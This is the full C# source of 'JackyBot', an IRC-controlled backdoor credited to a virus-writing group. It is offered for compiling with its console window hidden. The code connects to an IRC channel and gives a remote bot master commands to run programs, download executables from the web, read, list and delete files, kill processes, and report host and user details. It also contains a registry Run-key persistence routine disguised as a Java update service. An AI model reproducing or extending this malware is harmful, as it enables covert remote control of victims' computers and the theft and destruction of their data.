   /************************************************************************
    * MSIL.JackyBot
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    * by free0n
    * vx13d.net | DoomRiderz www.doomriderz.com
    * ######################################################################
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************
    * ++JackyBot++
    * Jackybot is a IRC bot written in C#. The bot is multi threaded and
    * runs based on basic configuration specified in program.cs All commands
    * are issued based on one of the folling matching commands
    * Commands:
    * $run - runs files usage: $run^c:\file.exe or $run^home\file.exe where home is dir of bot
    * $goto - opens a webpage usage: $goto^http://www.google.com
    * $download - downloads files from website usage: $download^http://www.yoursite.com/file.exe
    * $reboot - kills all processes and does a force reboot
    * $beep - plays jingle bells with a serious of beeps
    * $sendip - writes the ip of the computer
    * $setdir - changes the directory for showfiles usage:$setdir^c:\ or $setdir^home where home is dir of bot
    * $showfiles - lists all files in the working dir usage:$showfiles
    * $viewfile - reads a file usage: $viewfile^c:\text.txt or $viewfile^home\text.txt where home is dir of bot
    * $delfile - deletes file usage $delfile^c:\text.txt or $delfile^home\text.txt where home is dir of bot
    * $showproc - shows all processes by name on the computer usage:$showproc
    * $killproc - kills a specified process usage:$killproc^notepad.exe
    * $showinfo - retrieve information about the host usage:$showinfo
    * $join - joins a chatroom usage:$join^#channel
    * $leave - leaves a chatroom usage:$leave^#channel
    * $kickmeout - tells the bot to close connections (warning:will not reconnect until boot)
    * The way it works is on irc u can private message the bot or address it in
    * a channel and if the command has to specifiy any arguments you just do
    * a carrot between them. Pretty simple bot has some good file manipulation
    * commands and some basic irc ones.
    *
    * Compile with visual C# express, in project properties change the console
    * application to windows application to hide the dos box.
    * enjoy :)
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************/

   /*************************************************************************
    * Start of Program.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************/

   using System;
   using System.Collections.Generic;
   using System.ComponentModel;
   using System.Data;
   using System.Text;
   using System.Threading;
   using System.Resources;
   using Microsoft.Win32;
   using System.Runtime.InteropServices;
   using System.IO;
   using System.Windows.Forms;

   namespace Jacky {

       class Jacky {

           private static Thread myThread;
           private static string myPath = Application.StartupPath + "\" + Application.ProductName + ".exe";

           static void Main(string[] args) {
               //CheckRegistry();
               myThread = new Thread(new ThreadStart(runIrc));
               myThread.Start();
           }

           private static void runIrc() {
               IRC irc = new IRC();
               irc.start("apena", 6667, "#jackybot", "jacky", "free0n");
               irc.connect();
           }


           private static void CheckRegistry() {
               string regRoot = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
               string azrealStart = (string)Registry.GetValue(regRoot, "SunJavaUpdateService", "SunJavaUpdateService");
               if (azrealStart == "SunJavaUpdateService") {
                   Registry.SetValue(regRoot, "SunJavaUpdateService", myPath);
               }
           }

       }
   }

   /*************************************************************************
    * Start of IRC.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************/

   using System;
   using System.Collections;
   using System.Collections.Generic;
   using System.Text;
   using System.Net;
   using System.Net.Sockets;
   using System.Web;
   using System.IO;
   using System.Threading;
   using System.Diagnostics;
   using System.Resources;
   using Microsoft.Win32;
   using System.Runtime.InteropServices;
   using System.Windows.Forms;


   namespace Jacky {

       class IRC {

           public static string ho;
           private int po;
           private string channel;
           private string nick;
           private string botMaster;
           public static StreamWriter smw;
           private static string USER = "USER JackyBot www.vx13d.net vx13d.net :Jacky";
           private ArrayList arrProcs;
           private string val = "";
           public string myPath = Application.StartupPath;

           public void start(string host, int port, string chan, string nickname, string master) {
               ho = host;
               po = port;
               channel = chan;
               nick = nickname;
               botMaster = master;
           }

           public void connect() {
               NetworkStream ns;
               TcpClient tp;
               StreamReader reader;

               string input;
               string nix;
               int nixAppend = 0;

               try {
                   tp = new TcpClient(ho, po);
                   ns = tp.GetStream();
                   reader = new StreamReader(ns);
                   smw = new StreamWriter(ns);

                   smw.WriteLine("NICK " + nick);
                   smw.Flush();

                   smw.WriteLine(USER);
                   smw.Flush();

                   Pinger ping = new Pinger();
                   ping.Start();

                   smw.WriteLine("JOIN " + channel);
                   smw.Flush();

                   while (true) {
                       while ((input = reader.ReadLine()) != null) {
                           Console.WriteLine("input:" + input);
                           if (input.Contains("433  " + nick + " :Nickname is already in use")) {
                               nixAppend = nixAppend + 1;
                               nick = nick + "_" + nixAppend;
                           }
                           if (input.Contains("PING :")) {
                               string pingval = "";
                               if (input.IndexOf(":") != -1) {
                                   try {
                                       pingval = input.Substring(input.IndexOf(":"), (input.Length - input.IndexOf(":")));
                                       pingval = pingval.Replace(":", "");
                                       //Console.WriteLine("Ping Val:" + pingval);
                                       smw.WriteLine("PONG :" + pingval);
                                       smw.Flush();

                                       smw.WriteLine("NICK " + nick);
                                       smw.Flush();

                                       smw.WriteLine(USER);
                                       smw.Flush();

                                       smw.WriteLine("JOIN " + channel);
                                       smw.Flush();

                                   } catch (Exception er) {
                                       Console.WriteLine("exception:" + er);
                                   }
                               }

                           }
                           if (!input.Contains("PONG")) {
                               Console.WriteLine("input:" + input);
                           }
                           if (input != "") {
                               nix = GetNick(input);

                               if (nix == botMaster) {
                                   if (input.Contains("$")) {
                                       string cmd = ParseArgs(input);
                                       switch (cmd) {
                                           case "$run":
                                               smw.WriteLine("NOTICE " + nix + " :Going to run " + getVal());
                                               Run(getVal());
                                               smw.Flush();
                                               break;
                                           case "$goto":
                                               smw.WriteLine("NOTICE " + nix + " :Going to website " + getVal());
                                               WebSite(getVal());
                                               smw.Flush();
                                               break;
                                           case "$download":
                                               smw.WriteLine("NOTICE " + nix + " :Going to download " + getVal());
                                               Download(getVal());
                                               smw.WriteLine("NOTICE " + nix + " :Download completed - Saved to " + myPath);
                                               smw.Flush();
                                               break;
                                           case "$reboot":
                                               smw.WriteLine("NOTICE " + nix + " :Going to perform illegal reboot " + getVal());
                                               RestartComp();
                                               smw.Flush();
                                               break;
                                           case "$beep":
                                               Beep();
                                               smw.WriteLine("NOTICE " + nix + " :Beeped ");
                                               smw.Flush();
                                               break;
                                           case "$sendip":
                                               smw.WriteLine("NOTICE " + nix + " :Sending ip " + getIp());
                                               smw.Flush();
                                               break;
                                           case "$showproc":
                                               smw.WriteLine("NOTICE " + nix + " : Here are the current running procs");
                                               arrProcs = getProcs();
                                               IEnumerator myEnum = arrProcs.GetEnumerator();
                                               while (myEnum.MoveNext()) {
                                                   smw.WriteLine("NOTICE " + nix + " : " + myEnum.Current);
                                               }
                                               smw.Flush();
                                               break;
                                           case "$showfiles":
                                               smw.WriteLine("NOTICE " + nix + " :Here is the current files");
                                               arrProcs = getFiles();
                                               IEnumerator fileEnum = arrProcs.GetEnumerator();
                                               while (fileEnum.MoveNext()) {
                                                   smw.WriteLine("NOTICE " + nix + " : " + fileEnum.Current);
                                               }
                                               smw.WriteLine("NOTICE " + nix + " :File list completed");
                                               smw.Flush();
                                               break;
                                           case "$viewfile":
                                               smw.WriteLine("NOTICE " + nix + " :Here is what is in the file");
                                               arrProcs = viewFile(getVal());
                                               IEnumerator fEnum = arrProcs.GetEnumerator();
                                               while (fEnum.MoveNext()) {
                                                   smw.WriteLine("NOTICE " + nix + " : " + fEnum.Current);
                                               }
                                               smw.WriteLine("NOTICE " + nix + " :EOF");
                                               smw.Flush();
                                               break;
                                           case "$setdir":
                                               if (getVal() == "home") {
                                                   myPath = Application.StartupPath;
                                               } else {
                                                   myPath = getVal();
                                               }
                                               smw.WriteLine("NOTICE " + nix + " :Directory set to " + getVal());
                                               smw.Flush();
                                               break;
                                           case "$delfile":
                                               smw.WriteLine("NOTICE " + nix + " :Going to delete file " + getVal());
                                               deleteFile(getVal());
                                               smw.WriteLine("NOTICE " + nix + " :File Deleted use showfiles to verify");
                                               smw.Flush();
                                               break;
                                           case "$killproc":
                                               smw.WriteLine("NOTICE " + nix + " :Going to kill proc " + getVal());
                                               KillProc(getVal());
                                               smw.WriteLine("NOTICE " + nix + " :Killed proc do $showproc to verify " + getVal());
                                               smw.Flush();
                                               break;
                                           case "$showinfo":
                                               smw.WriteLine("NOTICE " + nix + " :Retrieving PC info");
                                               arrProcs = getInfo();
                                               IEnumerator pEnum = arrProcs.GetEnumerator();
                                               while (pEnum.MoveNext()) {
                                                   smw.WriteLine("NOTICE " + nix + " : " + pEnum.Current);
                                               }
                                               smw.WriteLine("NOTICE " + nix + " :Finished");
                                               smw.Flush();
                                               break;
                                          case "$join":
                                               smw.WriteLine("JOIN " + getVal());
                                               smw.WriteLine("NOTICE " + nix + " :Joined " + getVal());
                                               smw.Flush();
                                               break;
                                          case "$leave":
                                               smw.WriteLine("PART " + getVal());
                                               smw.WriteLine("NOTICE " + nix + " :left " + getVal());
                                               smw.Flush();
                                               break;
                                          case "$kickmeout":
                                               smw.WriteLine("NOTICE " + nix + " :Bye Bye");
                                               smw.Flush();
                                               smw.Close();
                                               reader.Close();
                                               tp.Close();
                                               break;
                                          case "$help":
                                               smw.WriteLine("NOTICE " + nix + " :Here are my commands");
                                               smw.WriteLine("NOTICE " + nix + " :Created by free0n http://www.vx13d.net");
                                               smw.WriteLine("NOTICE " + nix + " :$run ................[runs files usage: $run^c:\file.exe or $run^home\file.exe where home is dir of bot]");
                                               smw.WriteLine("NOTICE " + nix + " :$goto ...............[opens a webpage usage: $goto^http://www.google.com]");
                                               smw.WriteLine("NOTICE " + nix + " :$download ...........[downloads files from website usage: $download^http://www.yoursite.com/file.exe]");
                                               smw.WriteLine("NOTICE " + nix + " :$reboot .............[kills all processes and does a force reboot]");
                                               smw.WriteLine("NOTICE " + nix + " :$beep ...............[plays jingle bells with a serious of beeps]");
                                               smw.WriteLine("NOTICE " + nix + " :$sendip .............[writes the ip of the computer]");
                                               smw.WriteLine("NOTICE " + nix + " :$setdir .............[changes the directory for showfiles usage:$setdir^c:\ or $setdir^home where home is dir of bot]");
                                               smw.WriteLine("NOTICE " + nix + " :$showfiles ..........[lists all files in the working dir usage:$showfiles]");
                                               smw.WriteLine("NOTICE " + nix + " :$viewfile ...........[reads a file usage: $viewfile^c:\text.txt or $viewfile^home\text.txt where home is dir of bot]");
                                               smw.WriteLine("NOTICE " + nix + " :$delfile ............[deletes file usage $delfile^c:\text.txt or $delfile^home\text.txt where home is dir of bot]");
                                               smw.WriteLine("NOTICE " + nix + " :$showproc ...........[shows all processes by name on the computer usage:$showproc]");
                                               smw.WriteLine("NOTICE " + nix + " :$killproc ...........[kills a specified process usage:$killproc^notepad.exe]");
                                               smw.WriteLine("NOTICE " + nix + " :$showinfo ...........[retrieve information about the host usage:$showinfo]");
                                               smw.WriteLine("NOTICE " + nix + " :$join ...............[joins a chatroom usage:$join^#channel]");
                                               smw.WriteLine("NOTICE " + nix + " :$leave ..............[leaves a chatroom usage:$leave^#channel]");
                                               smw.WriteLine("NOTICE " + nix + " :$kickmeout ..........[tells the bot to close connections (warning:will not reconnect until boot)]");
                                               smw.Flush();
                                               break;
                                           default:
                                               smw.WriteLine("Command Not Understood");
                                               smw.Flush();
                                               break;
                                       }
                                   }
                               }
                           }
                       }
                   }

               } catch (Exception ex) {
                   Thread.Sleep(5000);
               }
           }

           public string GetNick(string input) {
               string nix = "";
               if (input.Contains("PRIVMSG")) {
                   if (input.IndexOf("!") != -1) {
                       nix = input.Substring(1, input.IndexOf("!") - 1);
                   }
               }
               return nix;
           }

           public string ParseArgs(string input) {
               string cmd = input;
               string val = "";

               try {
                   if (input != "") {
                       if (input.IndexOf("$") != -1) {
                           if (input.IndexOf("^") != -1) {
                               cmd = input.Substring(input.IndexOf("$"), (input.IndexOf("^") - input.IndexOf("$")));
                               val = input.Substring(input.IndexOf("^"), (input.Length - input.IndexOf("^")));
                               val = val.Replace("^", "");
                               val = val.Trim();
                               setVal(val);
                           } else {
                               cmd = input.Substring(input.IndexOf("$"), (input.Length - input.IndexOf("$")));
                           }
                       }
                   }
               } catch (Exception argh) {
                   Console.WriteLine("Exception:" + argh);
               }
               Console.WriteLine("cmd: {0} | val: {1}", cmd, val);
               return cmd;
           }

           public void WebSite(string addy) {
               System.Diagnostics.Process.Start(addy);
           }



           private void Download(string a) {
               string addy = a.Substring(0, a.LastIndexOf("/"));
               string file = a.Substring(a.LastIndexOf("/"), a.Length - a.LastIndexOf("/"));

               file = file.Replace("/", "");
               file.Trim();

               Console.WriteLine("File:" + file);

               string remoteUri = addy;
               string fileName = file;
               string myStringWebResource = null;

               WebClient myWebClient = new WebClient();

               myStringWebResource = remoteUri + "/" + fileName;
               Console.WriteLine("Downloading File "{0}" from "{1}" .......nn", fileName, myStringWebResource);

               myWebClient.DownloadFile(myStringWebResource, fileName);
               Console.WriteLine("Successfully Downloaded File "{0}" from "{1}"", fileName, myStringWebResource);
               Console.WriteLine("nDownloaded file saved in the following file system folder:nt");
           }

           private void Run(string h) {
               try {
                   if (h.Contains("home\") || h.Contains("Home\")) {
                       val = h.Substring(h.IndexOf("\"), (h.Length - h.IndexOf("\")));
                       string homePath = Application.StartupPath;
                       string file = homePath + val;
                       System.Diagnostics.Process Proc = new System.Diagnostics.Process();
                       Proc.StartInfo.FileName = file;
                       Proc.Start();

                   } else {
                       System.Diagnostics.Process Proc = new System.Diagnostics.Process();
                       Proc.StartInfo.FileName = h;
                       Proc.Start();
                   }
               } catch (Exception err) {
                   Console.WriteLine("Error:" + err);
               }
           }

           private ArrayList getProcs() {

               arrProcs = new ArrayList();
               arrProcs.Clear();

               try {
                   System.Diagnostics.Process[] myProcesses = System.Diagnostics.Process.GetProcesses();

                   for (int i = 0; i < myProcesses.Length; i++) {
                       arrProcs.Add(myProcesses[i].ProcessName);
                   }
               } catch (Exception err) {
                   arrProcs.Add("Error: " + err);
               }

               return arrProcs;
           }


           private ArrayList getInfo() {
               arrProcs = new ArrayList();
               arrProcs.Clear();

               try {
                   //basic info
                   arrProcs.Add("Comp Name:" + System.Environment.MachineName);
                   arrProcs.Add("Host Name:" + System.Net.Dns.GetHostByName("LocalHost").HostName);
                   arrProcs.Add("Os Version:" + Environment.OSVersion);
                   arrProcs.Add("User Name:" + Environment.UserName);
                   arrProcs.Add("System Dir:" + Environment.SystemDirectory);
                   arrProcs.Add("My Computer:" + Environment.SpecialFolder.MyComputer);

               } catch (Exception err) {
                   arrProcs.Add("Error: " + err);
               }

               return arrProcs;
           }

           private ArrayList getFiles() {
               arrProcs = new ArrayList();
               arrProcs.Clear();

               try {
                   //basic search in the current directory
                   DirectoryInfo di = new DirectoryInfo(myPath);
                   FileInfo[] rgFiles = di.GetFiles("*.*");

                   //look at each file
                   arrProcs.Add("Directory:" + myPath);

                   foreach (FileInfo fi in rgFiles) {
                       //string fullFile = searchpath + fi.Name;
                       arrProcs.Add(fi.Name);
                   }

                   foreach (string d in Directory.GetDirectories(myPath)) {
                       arrProcs.Add(d + " - dir");
                   }
               } catch (Exception err) {
                   arrProcs.Add("Errror:" + err);
               }

               return arrProcs;
           }

           private ArrayList viewFile(string f) {
               string file = f;
               arrProcs = new ArrayList();
               arrProcs.Clear();

               try {
                   if (f.Contains("home\") || f.Contains("Home\")) {
                       val = f.Substring(f.IndexOf("\"), (f.Length - f.IndexOf("\")));
                       string homePath = Application.StartupPath;
                       file = homePath + val;
                       Console.WriteLine("Home dir file is:" + file);
                   }

                   StreamReader srData;
                   string input;

                   Console.WriteLine("Opening file" + file);
                   srData = File.OpenText(file);
                   input = srData.ReadLine();

                   while (input != null) {
                       arrProcs.Add(input);
                       input = srData.ReadLine();
                   }

                   srData.Close();

               } catch (Exception err) {
                   arrProcs.Add("Error:" + err);
               }

               return arrProcs;
           }

           private void deleteFile(string f) {
               try {
                   if (f.Contains("home\") || f.Contains("Home\")) {
                       val = f.Substring(f.IndexOf("\"), (f.Length - f.IndexOf("\")));
                       string homePath = Application.StartupPath;
                       f = homePath + val;
                       File.Delete(f);
                   } else {
                       File.Delete(f);
                   }
               } catch (Exception err) {
                   Console.WriteLine("Delete error: " + err);
               }
           }

           private void KillProc(string n) {
               try {
                   System.Diagnostics.Process[] myProcesses = System.Diagnostics.Process.GetProcesses();
                   for (int i = 0; i < myProcesses.Length; i++) {
                       if (myProcesses[i].ProcessName == n) {
                           myProcesses[i].Kill();
                       }
                   }
               } catch (Exception err) {
                   Console.WriteLine("Couldn't kill proccess " + n);
                   Console.WriteLine("Error:" + err);
               }
           }

           public string getIp() {
               // Then using host name, get the IP address list..
               string ip = "";
               string strHostName = "";

               strHostName = Dns.GetHostName();
               IPHostEntry ipEntry = Dns.GetHostByName(strHostName);
               IPAddress[] addr = ipEntry.AddressList;

               for (int i = 0; i < addr.Length; i++) {
                   ip = addr[i].ToString();
               }
               return ip;
           }

           private void Beep() {
               Console.Beep(330, 250);
               Console.Beep(330, 250);
               Console.Beep(330, 500);
               Console.Beep(330, 250);
               Console.Beep(330, 250);
               Console.Beep(330, 500);
               Console.Beep(330, 250);
               Console.Beep(392, 250);
               Console.Beep(262, 125);
               Console.Beep(294, 125);
               Console.Beep(330, 250);
           }


           private void RestartComp() {
               try {
                   System.Diagnostics.Process[] myProcesses = System.Diagnostics.Process.GetProcesses();
                   for (int i = 0; i < myProcesses.Length; i++) {
                       myProcesses[i].Kill();
                   }
               } catch (Exception err) {
                   Console.WriteLine("Error:" + err);
               }
           }

           public string getVal() {
               return val;
           }

           public void setVal(string v) {
               val = v;
           }
       }
   }

   /*************************************************************************
    * Start of Pinger.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************/

   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.Threading;

   namespace Jacky {
       class Pinger {
           private string PING = "PING :";
           private Thread pingSender;

           public Pinger() {
               pingSender = new Thread(new ThreadStart(this.Run));
           }

           public void Start() {
               pingSender.Start();
           }

           public void Run() {
               while (true) {
                   try {
                       IRC.smw.WriteLine(PING + IRC.ho);
                       IRC.smw.Flush();
                       Thread.Sleep(15000);
                   } catch (Exception ex) {

                   }
               }
           }
       }
   }
